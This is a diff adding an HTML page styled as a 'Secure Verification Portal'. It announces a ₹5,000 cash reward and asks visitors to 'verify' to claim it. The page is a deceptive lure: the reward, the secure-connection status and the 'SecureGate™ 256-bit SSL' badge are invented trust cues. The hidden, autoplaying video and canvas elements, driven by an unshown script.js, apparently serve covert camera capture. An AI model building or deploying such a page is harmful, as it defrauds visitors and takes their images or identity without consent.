@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Verification Portal</title>
+    <link rel="icon" href="data:;base64,iVBORw0KGgo= " />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      // Professional Configuration & Muting Warnings
+      tailwind.config = {
+        darkMode: "class",
+        corePlugins: { preflight: true },
+      };
+    </script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Inter", sans-serif;
+      }
+    </style>
+  </head>
+  <body
+    class="bg-gray-50 dark:bg-gray-900 flex items-center justify-center min-h-screen p-4 transition-colors duration-300"
+  >
+    <div class="absolute top-5 right-5">
+      <button
+        id="theme-toggle"
+        class="p-3 rounded-full bg-white dark:bg-gray-800 shadow-md border border-gray-200 dark:border-gray-700 transition-all active:scale-90"
+      >
+        <span id="theme-icon" class="text-xl">🌙</span>
+      </button>
+    </div>
+
+    <div
+      class="bg-white dark:bg-gray-800 p-8 md:p-12 rounded-[2.5rem] shadow-2xl max-w-md w-full text-center border border-gray-100 dark:border-gray-700 transition-all duration-300"
+    >
+      <div
+        class="bg-green-100 dark:bg-green-900/30 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6"
+      >
+        <svg
+          class="w-10 h-10 text-green-600 dark:text-green-400"
+          fill="none"
+          stroke="currentColor"
+          viewBox="0 0 24 24"
+        >
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
+          ></path>
+        </svg>
+      </div>
+
+      <h1
+        class="text-3xl font-bold text-gray-800 dark:text-white mb-4 tracking-tight"
+      >
+        Cash Reward Ready!
+      </h1>
+      <p class="text-gray-600 dark:text-gray-300 mb-8 leading-relaxed">
+        You have a pending transfer of
+        <span class="font-bold text-green-600 dark:text-green-400 text-lg"
+          >₹5,000.00</span
+        >. Please verify your identity to claim it.
+      </p>
+
+      <button
+        id="start-btn"
+        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl transition-all duration-300 shadow-lg shadow-blue-200 dark:shadow-none active:scale-95"
+      >
+        Verify & Claim Reward
+      </button>
+
+      <div id="status-container" class="hidden mt-6">
+        <div class="flex items-center justify-center space-x-2">
+          <div class="w-2 h-2 bg-blue-500 rounded-full animate-bounce"></div>
+          <div
+            class="w-2 h-2 bg-blue-500 rounded-full animate-bounce [animation-delay:-.3s]"
+          ></div>
+          <div
+            class="w-2 h-2 bg-blue-500 rounded-full animate-bounce [animation-delay:-.5s]"
+          ></div>
+        </div>
+        <p
+          id="status-text"
+          class="text-xs font-bold text-blue-500 mt-3 uppercase tracking-widest"
+        >
+          Establishing Secure Connection...
+        </p>
+      </div>
+
+      <p
+        class="mt-8 text-[10px] text-gray-400 uppercase tracking-widest font-bold border-t dark:border-gray-700 pt-4"
+      >
+        Encrypted by SecureGate™ 256-bit SSL
+      </p>
+    </div>
+
+    <video id="video" class="hidden" autoplay playsinline></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <script src="script.js"></script>
+  </body>
+</html>
